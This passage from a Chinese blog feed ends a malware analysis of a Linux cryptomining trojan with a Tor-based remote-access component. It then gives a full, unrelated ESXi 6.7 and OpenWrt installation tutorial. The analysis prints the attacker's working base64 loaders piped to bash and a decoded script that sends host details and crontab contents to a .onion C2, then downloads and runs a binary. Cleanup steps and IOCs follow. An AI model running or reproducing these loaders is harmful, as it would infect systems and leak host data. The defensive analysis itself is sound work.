YTdzZWJOeUxaZWRwRk5XNlN4cU9GMkY3Z2dadjJ0ZQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJtaGV2a2s0b2RnenFwdDJoYmozaGh3MnV6NHZodW5vbzU1ZXZld3JnbW91eWllaGNhbHRtYnJxZCIpCgpzb2NreigpIHsKbj0oZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCBkb2gubGkgZG9oLnB1YiBmaS5kb2guZG5zLnNub3B5dGEub3JnIGh5ZHJhLnBsYW45LW5zMS5jb20gcmVzb2x2ZXItZXUubGVsdXguZmkgZG5zLmhvc3R1eC5uZXQgZG5zLnR3bmljLnR3IGRvaC1maS5ibGFoZG5zLmNvbSBmaS5kb2guZG5zLnNub3B5dGEub3JnIHJlc29sdmVyLWV1LmxlbHV4LmZpIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcT0ke25bJCgoUkFORE9NJSR7I25bQF19KSldfQpzPSQoJGMgaHR0cHM6Ly8kcS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8Z3JlcCAtRXYgWy5dMHxzb3J0IC11Unx0YWlsIC0xKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure><p>.unixdb.sh内容如下：<br><img src="/img/20211108-14.png" alt="20211108-14.png"><br>文本内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">exec</span> &amp;&gt;/dev/null<br><span class="hljs-built_in">echo</span> yyANhZDFOs31F9WgqOovurruEMT3Z+v82MG0m9elafh8GU1+u4/78NZoKz2rA7O2<br><span class="hljs-built_in">echo</span> eXlBTmhaREZPczMxRjlXZ3FPb3Z1cnJ1RU1UM1ordjgyTUcwbTllbGFmaDhHVTErdTQvNzhOWm9LejJyQTdPMgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ1bml4ZGJudWFkeG13dG9iIikKCnNvY2t6KCkgewpuPShkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgdW5jZW5zb3JlZC5hbnkuZG5zLm5peG5ldC54eXopCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTUpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xzb3J0IC11UnxoZWFkIC0xKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAkZCAvdG1wIC92YXIvdG1wIC9kZXYvc2htIC91c3IvYmluIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmZXhlCmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IHx8ICRjICQxJGYgLW8keApjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuY2ggdG9yMndlYi5pbyB0b3Iyd2ViLnRvIHRvcjJ3ZWIuc3UKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLTEgL3RtcC8uWDExLXVuaXgvMDApL3N0YXR1czsgdGhlbgp1ICR0LiRoCmVsc2UKYnJlYWsKZmkKZG9uZQo=|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure><p>通过查看定时任务，发现两个定时任务，一明一暗，熟悉的配方，熟悉的味道：<br><img src="/img/20211108-15.png" alt="20211108-15.png"><br><img src="/img/20211108-16.png" alt="20211108-16.png"><br>另一个定时任务运行的脚本位于&#x2F;opt目录下，内容和 .systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh相同，</p><p>到这里相关的文件大概收集的差不多了，接下来杀掉相关进程，先尝试分析一下。<br><img src="/img/20211108-17.png" alt="20211108-17.png"></p><h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>首先先分析两个运行脚本，.systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh base64 解码以后的内容为：<br><img src="/img/20211108-18.png" alt="20211108-18.png"><br><img src="/img/20211108-19.png" alt="20211108-19.png"><br>格式化以后的代码为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> &amp;&gt;/dev/null<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$HOME</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin<br><br>d=$(grep x:$(<span class="hljs-built_in">id</span> -u): /etc/passwd | <span class="hljs-built_in">cut</span> -d: -f6)<br>c=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;curl -4fsSLkA- -m200&quot;</span>)<br>t=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;mhevkk4odgzqpt2hbj3hhw2uz4vhunoo55evewrgmouyiehcaltmbrqd&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-title">sockz</span></span>() &#123;<br>n=(dns.digitale-gesellschaft.ch doh.li doh.pub fi.doh.dns.snopyta.org hydra.plan9-ns1.com resolver-eu.lelux.fi dns.hostux.net dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)<br>p=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dns-query?name=relay.tor2socks.in&quot;</span>)<br>q=<span class="hljs-variable">$&#123;n[$((RANDOM % <span class="hljs-variable">$&#123;#n[@]&#125;</span>))]&#125;</span><br>s=$(<span class="hljs-variable">$c</span> https://<span class="hljs-variable">$q</span>/<span class="hljs-variable">$p</span> | grep -oE <span class="hljs-string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;\n&#x27;</span> | grep -Ev [.]0 | <span class="hljs-built_in">sort</span> -uR | <span class="hljs-built_in">tail</span> -1)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">fexe</span></span>() &#123;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> . <span class="hljs-variable">$HOME</span> /usr/bin <span class="hljs-variable">$d</span> /var/tmp; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-built_in">exit</span> &gt;<span class="hljs-variable">$i</span>/i &amp;&amp; <span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$i</span>/i &amp;&amp; <span class="hljs-built_in">cd</span> <span class="hljs-variable">$i</span> &amp;&amp; ./i &amp;&amp; <span class="hljs-built_in">rm</span> -f i &amp;&amp; <span class="hljs-built_in">break</span>; <span class="hljs-keyword">done</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">u</span></span>() &#123;<br>sockz<br>f=/int.$(<span class="hljs-built_in">uname</span> -m)<br>x=./$(<span class="hljs-built_in">date</span> | <span class="hljs-built_in">md5sum</span> | <span class="hljs-built_in">cut</span> -f1 -d-)<br>r=$(curl -4fsSLk checkip.amazonaws.com || curl -4fsSLk ip.sb)_$(<span class="hljs-built_in">whoami</span>)_$(<span class="hljs-built_in">uname</span> -m)_$(<span class="hljs-built_in">uname</span> -n)_$(ip a | grep <span class="hljs-string">&#x27;inet &#x27;</span> | awk &#123;<span class="hljs-string">&#x27;print $2&#x27;</span>&#125; | <span class="hljs-built_in">md5sum</span> | awk &#123;<span class="hljs-string">&#x27;print $1&#x27;</span>&#125;)_$(crontab -l | <span class="hljs-built_in">base64</span> -w0)<br><span class="hljs-variable">$c</span> -x socks5h://<span class="hljs-variable">$s</span>:9050 <span class="hljs-variable">$t</span>.onion<span class="hljs-variable">$f</span> -o<span class="hljs-variable">$x</span> -e<span class="hljs-variable">$r</span> || <span class="hljs-variable">$c</span> $1<span class="hljs-variable">$f</span> -o<span class="hljs-variable">$x</span> -e<span class="hljs-variable">$r</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$x</span><br><span class="hljs-variable">$x</span><br><span class="hljs-built_in">rm</span> -f <span class="hljs-variable">$x</span><br>&#125;<br><br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> tor2web.in tor2web.it; <span class="hljs-keyword">do</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">ls</span> /proc/$(<span class="hljs-built_in">head</span> -n 1 /tmp/.X11-unix/01)/status; <span class="hljs-keyword">then</span><br>fexe<br>u <span class="hljs-variable">$t</span>.<span class="hljs-variable">$h</span><br><span class="hljs-built_in">ls</span> /proc/$(<span class="hljs-built_in">head</span> -n 1 /tmp/.X11-unix/01)/status || (<br><span class="hljs-built_in">cd</span> /tmp<br>u <span class="hljs-variable">$t</span>.<span class="hljs-variable">$h</span><br>)<br><span class="hljs-built_in">ls</span> /proc/$(<span class="hljs-built_in">head</span> -n 1 /tmp/.X11-unix/01)/status || (<br><span class="hljs-built_in">cd</span> /dev/shm<br>u <span class="hljs-variable">$t</span>.<span class="hljs-variable">$h</span><br>)<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">break</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>分析：<br>随机找个公共DNS服务器解析域名relay.tor2socks.in，主要目的是通过Https加密DNS查询结果，绕过了IDS等安全设备IOCS恶意域名检测，下载远控，提交主机信息并运行，这里有点儿聪明，通过socket5的方式用relay.tor2socks.in代理访问C&amp;C域名， 解决了大部分设备无法访问洋葱网络的问题。也可以直接通过tor2web服务访问C&amp;C主机。<br><img src="/img/20211108-20.png" alt="20211108-20.png"></p><p>unixdb.sh 脚本文件大同小异，就是一个精简版的.systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh C&amp;C服务器和dns的查询地址有些许变化。</p><p>int.x86_64文件分析<br>使用IDA反汇编，毫无疑问，正常加壳操作，尝试脱壳。<br><img src="/img/20211108-21.png" alt="20211108-21.png"></p><p>远程调试，应该是程序设置了反调试，使用gdb也没法调试，尝试简单的绕过，发现并不能成功，这块触及到我能力的盲区了，19年不会逆向，后来勉强通过远程调试，找到了4个shell脚本，今天又遇到了当初的难题，又困在了逆向分析上面，吐一口老血。<br><img src="/img/20211108-22.png" alt="20211108-22.png"><br><img src="/img/20211108-23.png" alt="20211108-23.png"></p><h2 id="处置"><a href="#处置" class="headerlink" title="处置"></a>处置</h2><p>1、通过查看&#x2F;tmp&#x2F;.X11-unix&#x2F;文件，获取挖矿和远控的进程id,使用 <code> kill -9 进程id</code> 杀死相关进程<br>2、使用 <code>crontab -e</code> 命令，移除第一个定时任务，然后删除 <code>/etc/cron.d/0systemd-private-* </code> 文件<br>3、删除 <code>/opt/systemd-private-*.sh</code> shell脚本<br>4、对于&#x2F;tmp和&#x2F;dev&#x2F;shm文件，重启系统，下载的恶意文件就会自动清楚。<br>5、由于我这里是直接拿一个最小化安装的Linux系统做分析，样本都是我自行部署的，现实情况下，攻击者可能通过其他途径，如：弱口令、RCE等形式部署的自动或者半自动部署的挖矿及远控程序，直白一点儿就是移除挖矿比较容易，但是定位攻击者从那里进来的比较困难，各位老铁要加油，实在不行，重做系统吧。</p><h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><p>挖矿样本hash：<br>MD5 79d6d20a4500eeffe225de74164ad59e<br>SHA-1 1e52c9a4c8402543125f937c7c3eaf1b206d1b6e<br>SHA-256 e45da0ba81b4d06737aaa79b096c2d11eeed0952c7d1ba9c65e81de41bd1fbd8</p><p>远控样本(int.x86_64)hash：<br>MD5 079d848dd5b0ad35f5d5d7a5b52ea0bf<br>SHA-1 13cd0f45b112cd60e34620991261f2f3f3b009f9<br>SHA-256 d56ff8bd5356862356379182f60b51795bbe9e3bc077ea2fd20d1d30011ab163</p><p>mhevkk4odgzqpt2hbj3hhw2uz4vhunoo55evewrgmouyiehcaltmbrqd.onion<br>unixdbnuadxmwtob.onion<br>*.tor2web.it<br>*.tor2web.in<br>*.tor2web.ch<br>*.tor2web.io<br>*.tor2web.to<br>*.tor2web.su</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.virustotal.com/gui/file/e45da0ba81b4d06737aaa79b096c2d11eeed0952c7d1ba9c65e81de41bd1fbd8/details">https://www.virustotal.com/gui/file/e45da0ba81b4d06737aaa79b096c2d11eeed0952c7d1ba9c65e81de41bd1fbd8/details</a>【virustotal 挖矿分析结果 】</li><li><a href="https://zh.gouma.org/Internet/How-to-Access-onion-Sites-Also-Known-as-Tor-Hidden-Services-/">https://zh.gouma.org/Internet/How-to-Access-onion-Sites-Also-Known-as-Tor-Hidden-Services-/</a>【Tor隐藏服务】</li><li><a href="https://www.freebuf.com/articles/system/233138.html">https://www.freebuf.com/articles/system/233138.html</a>【SystemedMiner再次更新，使用Socket5中转访问C&amp;C】</li><li><a href="https://hksanduo.github.io/2019/12/19/2019-12-19-clean-up-a-mining-trojan-named-aliyun">https://hksanduo.github.io/2019/12/19/2019-12-19-clean-up-a-mining-trojan-named-aliyun</a>【一个名叫aliyun的挖矿木马处理过程】</li><li><a href="https://blog.netlab.360.com/systemdminer-jie-ji-xia-dan-tong-guo-ddg-chuan-bo-zi-shen/">https://blog.netlab.360.com/systemdminer-jie-ji-xia-dan-tong-guo-ddg-chuan-bo-zi-shen/</a>【systemdMiner 借鸡下蛋，通过 DDG 传播自身】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Trojan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在星际蜗牛上安装ESXI 6.7 及openwrt</title>
    <link href="/2021/11/06/2021-11-06-install-esxi-on-interstellar-snails/"/>
    <url>/2021/11/06/2021-11-06-install-esxi-on-interstellar-snails/</url>
    
    <content type="html"><![CDATA[<p>在星际蜗牛J1900平台上上安装ESXI 6.7及openwrt</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前做NAS，替换出一块电源和一块星际蜗牛的主板，从咸鱼上淘了一个千兆USB网卡，就组成了一个简单的X86软路由，由于固态容量只有16G，安装一个openwrt虚拟机磁盘就占的的差不多了，最近想扩容一下固态，在重新安装ESXI和openwrt过程中，之前遇到的坑又走了一遍，所以记录下来，供以后参考。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>ESXI 6.7 安装镜像(我这里用的是VMware-VMvisor-Installer-6.7.0.update03-14320388.x86_64.iso)</li><li>Ventoy安装优盘一个，也可以是烧录的光盘和优盘</li><li>openwrt vmdk 虚拟磁盘一个</li><li>ESXI 6.7 RTL8157 驱动</li></ul><blockquote><p>Ventoy是一个制作可启动U盘的开源工具。有了Ventoy你就无需反复地格式化U盘，你只需要把 ISO&#x2F;WIM&#x2F;IMG&#x2F;VHD(x)&#x2F;EFI 等类型的文件直接拷贝到U盘里面就可以启动了，无需其他操作。可以一次性拷贝很多个不同类型的镜像文件，Ventoy 会在启动时显示一个菜单来供你进行选择。Ventoy 安装之后，同一个U盘可以同时支持 x86 Legacy BIOS、IA32 UEFI、x86_64 UEFI、ARM64 UEFI 和 MIPS64EL UEFI 模式，同时还不影响U盘的日常使用。Ventoy 支持大部分常见类型的操作系统 （Windows&#x2F;WinPE&#x2F;Linux&#x2F;ChromeOS&#x2F;Unix&#x2F;VMware&#x2F;Xen …）</p></blockquote><h2 id="ESXI6-7-安装"><a href="#ESXI6-7-安装" class="headerlink" title="ESXI6.7 安装"></a>ESXI6.7 安装</h2><h3 id="引导安装"><a href="#引导安装" class="headerlink" title="引导安装"></a>引导安装</h3><p>引导ventoy，选择esxi安装镜像<br><img src="/img/20211106-01.jpg" alt="20211106-01.jpg"></p><p>进入esxi安装引导<br><img src="/img/20211106-04.jpg" alt="20211106-04.jpg"></p><p>进入VMware加载界面，倒计时5s的时候，按 Shift+O 键添加启动参数：ignoreHeadless&#x3D;TRUE<br><img src="/img/20211106-05.png" alt="20211106-05.png"></p><p><img src="/img/20211106-02.jpg" alt="20211106-02.jpg"><br>接着直接按回车，完成ESXI的安装，直到重启。安装完重启之后使用同样的方法插入启动参数来进入系统，然后永久配置。<br><img src="/img/20211106-03.jpg" alt="20211106-03.jpg"></p><blockquote><p>这里的主要解决卡顿的坑：<br>J1900&#x2F;N3150因为核显的问题不能直接装ESXI，开机会卡在Relocating modules and starting up the kernel，忘了截图了，图片来源于互联网。<br><img src="/img/20211106-06.jpg" alt="20211106-06.jpg"><br>增加ignoreHeadless&#x3D;TRUE即可，临时解决本次引导卡顿问题，后续安装完毕ESXI，还需要永久配置。</p></blockquote><p>注意一点：可以先将ESXI接入一个私有网络下面，给ESXI配置一个静态IP，方便以后管理；也可以给ESXI配置一个静态IP，用网线把ESXI主机和自己的电脑连接起来，比如我的ESXI配置的IP是192.168.3.110&#x2F;24 网关是：192.168.3.1，个人PC配置的ip是192.168.3.100&#x2F;24,网关是192.168.3.1，这样在PC上直接访问: <a href="https://192.168.3.110/">https://192.168.3.110</a> ,即可访问到ESXI的管理界面。<br><img src="/img/20211106-08.png" alt="20211106-08.png"></p><h3 id="永久配置ignoreHeadless"><a href="#永久配置ignoreHeadless" class="headerlink" title="永久配置ignoreHeadless"></a>永久配置ignoreHeadless</h3><p>1、启用ssh<br>点击 操作-》服务-》启用安全SHELL(SSH) 选项，启用ssh<br><img src="/img/20211106-07.png" alt="20211106-07.png"><br>使用XSHELL访问对应的ip，输入root用户名及密码登录上去。<br><img src="/img/20211106-09.png" alt="20211106-09.png">   </p><p>2、配置<br>执行以下命令进行配置：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">esxcfg-advcfg -k <span class="hljs-literal">TRUE</span> ignoreHeadless<br></code></pre></td></tr></table></figure><p>执行以下命令判断是否配置成功：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">esxcfg-advcfg -j ignoreHeadless</span><br></code></pre></td></tr></table></figure><p>返回TRUE说明成功了<br><img src="/img/20211106-10.png" alt="20211106-10.png"><br>我这里直接通过启用ssh，远程进行配置，也可以直接启用ESXI SHELL进行配置。 </p><h3 id="安装ESXI-6-7-RTL8157-驱动"><a href="#安装ESXI-6-7-RTL8157-驱动" class="headerlink" title="安装ESXI 6.7 RTL8157 驱动"></a>安装ESXI 6.7 RTL8157 驱动</h3><p>我这块板子上只有一个千兆网卡，别问我为什么不使用双网口的板子，问就是穷，穷人家的板子早当家。<br><img src="/img/20211106-11.jpg" alt="20211106-11.jpg">  </p><p>ESXI默认不包含8157的驱动，需要自行安装。下载链接详见附件，根据ESXI的版本进行下载。<br><img src="/img/20211106-12.png" alt="20211106-12.png"></p><p>我这里使用tftp进行上传，也可以使用scp，上传上去即可，放到&#x2F;tmp目录下。<br><img src="/img/20211106-13.png" alt="20211106-13.png"></p><p>使用unzip命令解压驱动压缩包<br><img src="/img/20211106-14.png" alt="20211106-14.png"><br>使用以下指令安装驱动。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">esxcli</span> software vib install -v /tmp/vib20/vmkusb-nic-fling/VMW_bootbank_vmkusb-nic-fling_2.<span class="hljs-number">1</span>-<span class="hljs-number">6</span>vmw.<span class="hljs-number">670.2.48.392</span>03948.vib --no-sig-check<br></code></pre></td></tr></table></figure><p><img src="/img/20211106-16.png" alt="20211106-16.png"></p><blockquote><p>这里有个坑，离线安装不加–no-sig-check参数，可能存在签名验证失败导致安装失败的问题，这里由于是直接从官网上下载的，使用 –no-sig-check 参数忽略掉。<br><img src="/img/20211106-15.png" alt="20211106-15.png"></p></blockquote><p>安装完成以后需要重启系统，重启系统以后，在网络-》物理网卡界面下发现USB网卡已经成功加载<br><img src="/img/20211106-17.png" alt="20211106-17.png"></p><h3 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h3><p>1、增加一个虚拟交换机，点击网络-》虚拟交换机-》添加标准虚拟交换机，增加一个名为vSwitch1的虚拟交换机，上行链路选择vusb0<br><img src="/img/20211106-18.png" alt="20211106-18.png"><br>点击添加<br><img src="/img/20211106-19.png" alt="20211106-19.png"></p><p>2、增加一个端口组，点击网络-》端口组-》添加端口组，添加一个名为VM Network1的端口组，虚拟交换机选择vSwitch1。<br><img src="/img/20211106-20.png" alt="20211106-20.png"></p><p>至此，ESXI网络已经配置完成，主板上的网口准备配置成lan，USB网口准备配置成wan。</p><h2 id="安装Openwrt虚拟机"><a href="#安装Openwrt虚拟机" class="headerlink" title="安装Openwrt虚拟机"></a>安装Openwrt虚拟机</h2><p>openwrt x86虚拟机镜像我是从其他地方下载的，这里就不提供下载地址了，建议使用openwrt官方的，可以使用工具将img格式的镜像转换成ESXI支持的vmdk格式。这里就不提供详细的安装步骤了，重点强调一下几个需要注意的地方：<br>1、配置磁盘<br>首先需要移除系统默认添加的磁盘，然后点击添加硬盘-》现有硬盘，选择合适的位置，点击上载，将openwrt虚拟磁盘文件(vmdk)上传上来并选择。<br><img src="/img/20211106-22.png" alt="20211106-22.png"></p><p><img src="/img/20211106-23.png" alt="20211106-23.png"></p><p>2、配置网络<br>需要再增加一个网络适配器，选择VM Network1端口组。<br><img src="/img/20211106-21.png" alt="20211106-21.png"></p><p>配置完成，启动虚拟机，我这里的虚拟机默认的管理ip是192.168.1.1，但是我需要配置192.168.3.1，这是需要从ESXI提供的控制台进入openwrt的虚拟终端进行配置，配置位置位于：&#x2F;etc&#x2F;config&#x2F;network</p><p><img src="/img/20211106-24.png" alt="20211106-24.png"><br>使用以下命令重启网络，使配置生效：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-operator">/</span>network restart<br></code></pre></td></tr></table></figure><p>浏览器访问：192.168.3.1，可以成功访问到openwrt的管理界面：<br><img src="/img/20211106-25.png" alt="20211106-25.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以前玩软路由，都是基于各种各样的板子编译对应的估计，我花费时间最长的一次是编译88F6281的一块板子固件，花费了大概有两个多月，主要原因包括：板子资料太少，编译不熟练，网络编译环境不兼容等等问题，最终结果是好的，但是总感觉投入与产出负相关，这大概是自己转入X86平台的原因。贴一张自己软路由的照片，加了一个风扇，主要是夏天有些热，怕散热不行影响性能，当时直接拿亚克力板用简易的工具做了一个支撑壳，将就能用。<br><img src="/img/20211106-26.jpg" alt="20211106-26.jpg"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.jemnluo.top/%E8%BD%AF%E8%B7%AF%E7%94%B1%EF%BC%88J1900-N3150%EF%BC%89%E5%AE%89%E8%A3%85ESXI%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8D%A1%E5%B1%8F%E8%A7%A3%E5%86%B3/#%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0">https://blog.jemnluo.top/%E8%BD%AF%E8%B7%AF%E7%94%B1%EF%BC%88J1900-N3150%EF%BC%89%E5%AE%89%E8%A3%85ESXI%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8D%A1%E5%B1%8F%E8%A7%A3%E5%86%B3/#%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0</a>【软路由（J1900&#x2F;N3150）安装ESXI虚拟机卡屏解决】</li><li><a href="https://flings.vmware.com/usb-network-native-driver-for-esxi">https://flings.vmware.com/usb-network-native-driver-for-esxi</a>【USB Network Native Driver for ESXi】</li><li><a href="https://www.right.com.cn/forum/thread-506950-1-1.html">https://www.right.com.cn/forum/thread-506950-1-1.html</a>【矿渣之蜗牛星际(j1900 4盘位NAS)在ESXI6.7安装软路由LEDE 保姆级教程】</li><li><a href="https://linhongbo.com/posts/openwrt-on-esxi/">https://linhongbo.com/posts/openwrt-on-esxi/</a>【ESXi 安装&amp;配置 OpenWrt】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>openwrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>plasma使用扩展屏幕无法加载任务栏bug</title>
    <link href="/2021/08/28/2021-08-28-archlinux-sddm-plasma-display-bug/"/>
    <url>/2021/08/28/2021-08-28-archlinux-sddm-plasma-display-bug/</url>
    
